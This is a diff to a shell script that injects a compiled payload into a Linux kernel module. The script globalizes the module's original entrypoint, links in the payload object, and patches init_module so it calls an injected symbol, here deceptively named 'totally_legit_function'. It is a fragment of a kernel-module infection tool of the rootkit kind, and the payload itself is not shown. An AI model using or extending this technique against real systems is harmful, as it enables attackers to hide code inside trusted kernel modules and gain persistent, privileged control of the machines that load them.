@@ -5,9 +5,11 @@ OUTPUT_MODULE=$2
 # fetch the entrypoint from the target module
 SYMBOL_NAME=`./original.py $1` 
 
+OUR_MAIN=totally_legit_function
+
 # Compile our payload so it calls the target module.
 # uses SYMBOL_NAME to call it.
-SYMBOL_NAME=$SYMBOL_NAME make -C ./injection/
+OUR_MAIN=$OUR_MAIN SYMBOL_NAME=$SYMBOL_NAME make -C ./injection/
 
 # We need to globalize the original entrypoint so we can call it.
 objcopy --globalize-symbol=$SYMBOL_NAME $1 /tmp/step1.ko
@@ -19,4 +21,4 @@ ld -r /tmp/step1.ko \
 rm /tmp/step1.ko
 
 # Make init_module point to our new symbol
-python3 ./patcher.py $OUTPUT_MODULE $OUTPUT_MODULE
+python3 ./patcher.py $OUR_MAIN $OUTPUT_MODULE $OUTPUT_MODULE
